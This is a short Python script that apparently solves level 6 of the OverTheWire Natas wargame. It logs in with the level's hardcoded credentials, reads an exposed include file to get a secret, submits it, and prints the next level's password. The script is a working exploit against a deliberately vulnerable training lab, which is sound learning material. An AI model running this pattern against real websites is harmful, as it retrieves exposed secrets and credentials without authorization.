import requests
from requests.auth import HTTPBasicAuth
import re

username = "natas6"
password = "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS"
base_url = "http://natas6.natas.labs.overthewire.org/"

session = requests.Session()
secret_url = base_url + "includes/secret.inc"
res_secret = session.get(secret_url, auth=HTTPBasicAuth(username, password))

secret_match = re.search(r'"(.+)"', res_secret.text)
if secret_match:
    secret_value = secret_match.group(1)
else:
    exit()

data = {"secret": secret_value, "submit": "Submit"}
res_form = session.post(base_url, auth=HTTPBasicAuth(username, password), data=data)

pw_match = re.search(r"The password for natas7 is (\w+)", res_form.text)
if pw_match:
    print(pw_match.group(1))
